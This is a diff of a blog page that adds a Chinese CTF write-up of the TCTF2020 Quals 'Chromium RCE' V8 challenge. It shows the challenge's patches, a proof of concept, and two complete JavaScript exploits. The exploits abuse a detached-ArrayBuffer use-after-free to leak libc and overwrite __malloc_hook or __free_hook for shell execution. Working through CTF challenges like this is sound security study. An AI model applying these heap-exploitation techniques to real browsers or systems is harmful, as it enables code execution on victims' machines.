@@ -6,15 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | ruan</title>
+  <title>TCTF2020 Quals Chromium RCE题解 | ruan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ruan">
-<meta property="og:url" content="http://yoursite.com/archives/page/2/index.html">
+  <meta name="description" content="记录下当时很简单的一题v8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCTF2020 Quals Chromium RCE题解">
+<meta property="og:url" content="http://yoursite.com/2021/04/24/TCTF2020_Quals_Chromium_RCE/index.html">
 <meta property="og:site_name" content="ruan">
+<meta property="og:description" content="记录下当时很简单的一题v8">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://z3.ax1x.com/2021/04/23/cjZoBq.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/04/23/cjZTH0.png">
+<meta property="og:image" content="https://z3.ax1x.com/2021/04/24/cjcNOe.png">
+<meta property="article:published_time" content="2021-04-24T04:55:45.000Z">
+<meta property="article:modified_time" content="2021-04-24T04:57:39.109Z">
 <meta property="article:author" content="ruan">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z3.ax1x.com/2021/04/23/cjZoBq.png">
   
     <link rel="alternative" href="/atom.xml" title="ruan" type="application/atom+xml">
   
@@ -136,295 +144,195 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-TCTF2020_Quals_Chromium_RCE" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      TCTF2020 Quals Chromium RCE题解
+    </h1>
+  
+
+        
+        <a href="/2021/04/24/TCTF2020_Quals_Chromium_RCE/" class="archive-article-date">
+  	<time datetime="2021-04-24T04:55:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-24</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>记录下当时很简单的一题v8</p>
+<p><escape><span id="more"></span></escape></p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Enviroment: Ubuntu18.04</p>
+<p><strong>Update:</strong> If you want to build one for debugging, please<br><code>git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b</code></p>
+<h2 id="查看diff文件"><a href="#查看diff文件" class="headerlink" title="查看diff文件"></a>查看diff文件</h2><p>这里直接看注释就能理解，一个是不需要<code>--allow-native-syntax</code> flag 我们就能直接调用<code>%ArrayBufferDetach</code>，第二个是我们只能调用<code>%ArrayBufferDetach</code>，<code>%DebugPrint</code>这个就变成了<code>Undefined</code>了</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h</span><br><span class="line">index <span class="number">3519599</span>a88..f1ba0fb445 <span class="number">100644</span></span><br><span class="line">--- a/src/parsing/parser-base.h</span><br><span class="line">+++ b/src/parsing/parser-base.h</span><br><span class="line">@@ <span class="number">-1907</span>,<span class="number">10</span> +<span class="number">1907</span>,<span class="number">8</span> @@ ParserBase&lt;Impl&gt;::<span class="built_in">ParsePrimaryExpression</span>() &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">ParseTemplateLiteral</span>(<span class="built_in">impl</span>()-&gt;<span class="built_in">NullExpression</span>(), beg_pos, <span class="literal">false</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">case</span> Token::MOD:</span><br><span class="line">-      <span class="keyword">if</span> (<span class="built_in">flags</span>().<span class="built_in">allow_natives_syntax</span>() || extension_ != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">-        <span class="keyword">return</span> <span class="built_in">ParseV8Intrinsic</span>();</span><br><span class="line">-      &#125;</span><br><span class="line">-      <span class="keyword">break</span>;</span><br><span class="line">+      <span class="comment">// Directly call %ArrayBufferDetach without `--allow-native-syntax` flag</span></span><br><span class="line">+      <span class="keyword">return</span> <span class="built_in">ParseV8Intrinsic</span>();</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">default</span>:</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">diff --git a/src/parsing/parser.cc b/src/parsing/parser.cc</span><br><span class="line">index <span class="number">9577b</span>37397.<span class="number">.2206</span>d250d7 <span class="number">100644</span></span><br><span class="line">--- a/src/parsing/parser.cc</span><br><span class="line">+++ b/src/parsing/parser.cc</span><br><span class="line">@@ <span class="number">-357</span>,<span class="number">6</span> +<span class="number">357</span>,<span class="number">11</span> @@ <span class="function">Expression* <span class="title">Parser::NewV8Intrinsic</span><span class="params">(<span class="keyword">const</span> AstRawString* name,</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">const</span> Runtime::Function* function =</span></span></span><br><span class="line"><span class="function"><span class="params">       Runtime::FunctionForName(name-&gt;raw_data(), name-&gt;length());</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">+  <span class="comment">// Only %ArrayBufferDetach allowed</span></span></span></span><br><span class="line"><span class="function"><span class="params">+  <span class="keyword">if</span> (function-&gt;function_id != Runtime::kArrayBufferDetach) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">+    <span class="keyword">return</span> factory()-&gt;NewUndefinedLiteral(kNoSourcePosition);</span></span></span><br><span class="line"><span class="function"><span class="params">+  &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">+</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="comment">// Be more permissive when fuzzing. Intrinsics are not supported.</span></span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">if</span> (FLAG_fuzzing) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">return</span> NewV8RuntimeFunctionForFuzzing(function, args, pos);</span></span></span><br></pre></td></tr></table></figure>
+
+<p>测试下看看：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ruan@ubuntu  ~/chrome_challenge/tctf2020_chromium_rce/tctf  ./d8 --allow-natives-syntax          </span><br><span class="line">V8 version <span class="number">8.5</span><span class="number">.0</span> (candidate)</span><br><span class="line">d8&gt; var a = [<span class="number">1</span>];</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(a);</span><br><span class="line">undefined</span><br><span class="line">d8&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这个patch搜索了一番，应该是禁用了wasm的利用方法：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index <span class="number">117</span>df1cc52.<span class="number">.9</span>c6ca7275d <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ <span class="number">-1339</span>,<span class="number">9</span> +<span class="number">1339</span>,<span class="number">9</span> @@ <span class="function">MaybeLocal&lt;Context&gt; <span class="title">Shell::CreateRealm</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">     &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">delete</span>[] old_realms;</span></span></span><br><span class="line"><span class="function"><span class="params">   &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span></span></span><br><span class="line"><span class="function"><span class="params">   Local&lt;Context&gt; context =</span></span></span><br><span class="line"><span class="function"><span class="params">-      Context::New(isolate, <span class="literal">nullptr</span>, global_template, global_object);</span></span></span><br><span class="line"><span class="function"><span class="params">+      Context::New(isolate, <span class="literal">nullptr</span>, ObjectTemplate::New(isolate),</span></span></span><br><span class="line"><span class="function"><span class="params">+                   v8::MaybeLocal&lt;Value&gt;());</span></span></span><br><span class="line"><span class="function"><span class="params">   DCHECK(!try_catch.HasCaught());</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">if</span> (context.IsEmpty()) <span class="keyword">return</span> MaybeLocal&lt;Context&gt;();</span></span></span><br><span class="line"><span class="function"><span class="params">   InitializeModuleEmbedderData(context);</span></span></span><br><span class="line"><span class="function"><span class="params">@@ <span class="number">-2260</span>,<span class="number">10</span> +<span class="number">2260</span>,<span class="number">7</span> @@ <span class="keyword">void</span> Shell::Initialize(Isolate* isolate, D8Console* console,</span></span></span><br><span class="line"><span class="function"><span class="params">             v8::Isolate::kMessageLog);</span></span></span><br><span class="line"><span class="function"><span class="params">   &#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">-  isolate-&gt;SetHostImportModuleDynamicallyCallback(</span></span></span><br><span class="line"><span class="function"><span class="params">-      Shell::HostImportModuleDynamically);</span></span></span><br><span class="line"><span class="function"><span class="params">-  isolate-&gt;SetHostInitializeImportMetaObjectCallback(</span></span></span><br><span class="line"><span class="function"><span class="params">-      Shell::HostInitializeImportMetaObject);</span></span></span><br><span class="line"><span class="function"><span class="params">+  <span class="comment">// `import(&quot;xx&quot;)` is not allowed</span></span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"> #ifdef V8_FUZZILLI</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="comment">// Let the parent process (Fuzzilli) know we are ready.</span></span></span></span><br><span class="line"><span class="function"><span class="params">@@ <span class="number">-2285</span>,<span class="number">9</span> +<span class="number">2282</span>,<span class="number">9</span> @@ Local&lt;Context&gt; Shell::CreateEvaluationContext(Isolate* isolate) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="comment">// This needs to be a critical section since this is not thread-safe</span></span></span></span><br><span class="line"><span class="function"><span class="params">   base::MutexGuard lock_guard(context_mutex_.Pointer());</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="comment">// Initialize the global objects</span></span></span></span><br><span class="line"><span class="function"><span class="params">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span></span></span><br><span class="line"><span class="function"><span class="params">   EscapableHandleScope handle_scope(isolate);</span></span></span><br><span class="line"><span class="function"><span class="params">-  Local&lt;Context&gt; context = Context::New(isolate, <span class="literal">nullptr</span>, global_template);</span></span></span><br><span class="line"><span class="function"><span class="params">+  Local&lt;Context&gt; context = Context::New(isolate, <span class="literal">nullptr</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">+                                        ObjectTemplate::New(isolate));</span></span></span><br><span class="line"><span class="function"><span class="params">   DCHECK(!context.IsEmpty());</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">if</span> (i::FLAG_perf_prof_annotate_wasm || i::FLAG_vtune_prof_annotate_wasm) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">     isolate-&gt;SetWasmLoadSourceMapCallback(ReadFile);</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里的diff应该是让<code>TypedArray.prototype.set()</code>能作用于一个<code>DetachedBuffer</code>上：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq</span><br><span class="line">index b5c9dcb261..babe7da3f0 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/typed-array-set.tq</span><br><span class="line">+++ b/src/builtins/typed-array-set.tq</span><br><span class="line">@@ <span class="number">-70</span>,<span class="number">7</span> +<span class="number">70</span>,<span class="number">7</span> @@ <span class="built_in">TypedArrayPrototypeSet</span>(</span><br><span class="line">     <span class="comment">// 7. Let targetBuffer be target.[[ViewedArrayBuffer]].</span></span><br><span class="line">     <span class="comment">// 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError</span></span><br><span class="line">     <span class="comment">//   exception.</span></span><br><span class="line">-    <span class="keyword">const</span> utarget = typed_array::<span class="built_in">EnsureAttached</span>(target) otherwise IsDetached;</span><br><span class="line">+    <span class="keyword">const</span> utarget = %RawDownCast&lt;AttachedJSTypedArray&gt;(target);</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">const</span> overloadedArg = arguments[<span class="number">0</span>];</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">@@ <span class="number">-86</span>,<span class="number">8</span> +<span class="number">86</span>,<span class="number">7</span> @@ <span class="built_in">TypedArrayPrototypeSet</span>(</span><br><span class="line">       <span class="comment">// 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].</span></span><br><span class="line">       <span class="comment">// 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError</span></span><br><span class="line">       <span class="comment">//   exception.</span></span><br><span class="line">-      <span class="keyword">const</span> utypedArray =</span><br><span class="line">-          typed_array::<span class="built_in">EnsureAttached</span>(typedArray) otherwise IsDetached;</span><br><span class="line">+      <span class="keyword">const</span> utypedArray = %RawDownCast&lt;AttachedJSTypedArray&gt;(typedArray);</span><br><span class="line"> </span><br><span class="line">       <span class="built_in">TypedArrayPrototypeSetTypedArray</span>(</span><br><span class="line">           utarget, utypedArray, targetOffset, targetOffsetOverflowed)</span><br></pre></td></tr></table></figure>
+
+<p>poc如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var buffer1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line">var uint8_1 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer1);</span><br><span class="line">var buffer2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line">var uint8_2 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer2);</span><br><span class="line"><span class="comment">// %DebugPrint(uint8_2);</span></span><br><span class="line">%<span class="built_in">ArrayBufferDetach</span>(buffer1);</span><br><span class="line">uint8_2.<span class="built_in">set</span>(uint8_1);</span><br><span class="line">uint8_2[<span class="number">0</span>] = <span class="number">0xca</span>;</span><br><span class="line">uint8_2[<span class="number">0x1</span>] = <span class="number">0xfe</span>;</span><br><span class="line">uint8_1.<span class="built_in">set</span>(uint8_2);</span><br><span class="line">%<span class="built_in">DebugPrint</span>(uint8_2);</span><br><span class="line">%<span class="built_in">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cjZoBq"><img src="https://z3.ax1x.com/2021/04/23/cjZoBq.png" alt="cjZoBq.png"></a><br><a target="_blank" rel="noopener" href="https://imgtu.com/i/cjZTH0"><img src="https://z3.ax1x.com/2021/04/23/cjZTH0.png" alt="cjZTH0.png"></a></p>
+<p>我自己编译了一个debug版本的d8，而且把最后两个diff给去掉了，这样就能用<code>%DebugPrint</code>和<code>%SystemBreak</code>了</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>经过上面的分析，这题就变向的变成了一道堆题目，利用过程如下：</p>
+<ul>
+<li>从<code>unsortedbin</code>里泄露libc地址</li>
+<li>由于ArrayBuffer在分配的时候使用calloc分配的，所以先把0x70大小的tcache填满，在释放一个chunk到0x70大小的fastbin</li>
+<li>修改fastbin的fd，使其指向<code>__malloc_hook-0x23</code>，在改<code>__malloc_hook</code>为one_gadget就行</li>
+</ul>
+<p>最终exp：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leak libc</span></span><br><span class="line"><span class="keyword">var</span> buffer1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x2000</span>);</span><br><span class="line"><span class="keyword">var</span> uint64_arr1 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer1);</span><br><span class="line"><span class="keyword">var</span> buffer2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x2000</span>);</span><br><span class="line"><span class="keyword">var</span> read_array = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer2);</span><br><span class="line"></span><br><span class="line">%ArrayBufferDetach(buffer1);</span><br><span class="line">read_array.set(uint64_arr1);</span><br><span class="line"><span class="keyword">var</span> libc_base = read_array[<span class="number">1</span>] - <span class="number">0x3ebca0n</span>;</span><br><span class="line"><span class="keyword">var</span> malloc_hook = libc_base + <span class="number">0x3ebc30n</span>;</span><br><span class="line"><span class="keyword">var</span> one_gadget = libc_base + <span class="number">0xe5622n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;libc_base : 0x&quot;</span> + libc_base.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> one = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0n</span>;i &lt; <span class="number">8n</span>;i++)&#123;</span><br><span class="line">    one[i] = <span class="built_in">Number</span>((one_gadget &gt;&gt; i*<span class="number">8n</span>) &amp; <span class="number">0xffn</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tcache_chunks = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">7</span>;i++)&#123;</span><br><span class="line">    tcache_chunks[i] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> alloc1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="keyword">var</span> uint64_arr2 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(alloc1);</span><br><span class="line"><span class="keyword">var</span> alloc2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="keyword">var</span> write_array = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(alloc2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">6</span>;i++)&#123;</span><br><span class="line">    %ArrayBufferDetach(tcache_chunks[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%ArrayBufferDetach(alloc2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uint64_arr2[<span class="number">0</span>] = malloc_hook - <span class="number">0x23n</span>;</span><br><span class="line">write_array.set(uint64_arr2);</span><br><span class="line"></span><br><span class="line">alloc2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x60</span>);</span><br><span class="line">alloc2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x60</span>);</span><br><span class="line">write_array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(alloc2);</span><br><span class="line"><span class="comment">// %DebugPrint(write_array);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_array.set(one,<span class="number">0x13</span>);</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cjcNOe"><img src="https://z3.ax1x.com/2021/04/24/cjcNOe.png" alt="cjcNOe.png"></a></p>
+<p>one_gadget的地址可能会因为不同版本的libc而不同</p>
+<p>解出来后，去搜索了下别人的wp，看到能让Array使用malloc分配内存的办法：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;&#125;;</span><br><span class="line">a.length = size; <span class="comment">// malloc的大小</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(a);</span><br></pre></td></tr></table></figure>
+
+<p>这样子的话好利用多了，直接改tcache的fd就行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leak libc</span></span><br><span class="line"><span class="keyword">var</span> buffer1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x2000</span>);</span><br><span class="line"><span class="keyword">var</span> uint64_arr1 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer1);</span><br><span class="line"><span class="keyword">var</span> buffer2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x2000</span>);</span><br><span class="line"><span class="keyword">var</span> read_array = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer2);</span><br><span class="line"></span><br><span class="line">%ArrayBufferDetach(buffer1);</span><br><span class="line">read_array.set(uint64_arr1);</span><br><span class="line"><span class="keyword">var</span> libc_base = read_array[<span class="number">1</span>] - <span class="number">0x3ebca0n</span>;</span><br><span class="line"><span class="keyword">var</span> free_hook = libc_base + <span class="number">0x3ed8e8n</span>;</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x4f550n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;libc_base : 0x&quot;</span> + libc_base.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> system = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0n</span>;i &lt; <span class="number">8n</span>;i++)&#123;</span><br><span class="line">    system[i] = <span class="built_in">Number</span>((system_addr &gt;&gt; i*<span class="number">8n</span>) &amp; <span class="number">0xffn</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">malloc_size</span>(<span class="params">sz</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = &#123;&#125;;</span><br><span class="line">    a.length = sz; <span class="comment">// malloc的大小</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> alloc1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="keyword">var</span> uint64_arr2 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(alloc1);</span><br><span class="line"><span class="keyword">var</span> alloc2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="keyword">var</span> write_array = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(alloc2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%ArrayBufferDetach(alloc2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uint64_arr2[<span class="number">0</span>] = free_hook;</span><br><span class="line">write_array.set(uint64_arr2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> t = malloc_size(<span class="number">0x60</span>);</span><br><span class="line">t = malloc_size(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">uint64_arr2[<span class="number">0</span>] = <span class="number">0x68732f6e69622fn</span>;		<span class="comment">// /bin/sh\x00</span></span><br><span class="line">t.set(system);</span><br><span class="line">%ArrayBufferDetach(uint64_arr2.buffer);</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次是真的自己认认真真的没有参考别人的wp来解的（算是能看的懂简单的v8了？），希望今年的tctf不要爆零</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://eternalsakura13.com/2019/07/16/qwb%20growupjs%20&amp;%20wctf%20independence_day%20writeup/">https://eternalsakura13.com/2019/07/16/qwb%20growupjs%20&amp;%20wctf%20independence_day%20writeup/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.keenan.top/2020/06/29/0ctf-chromium-rce/">https://blog.keenan.top/2020/06/29/0ctf-chromium-rce/</a></p>
+</li>
+</ul>
+
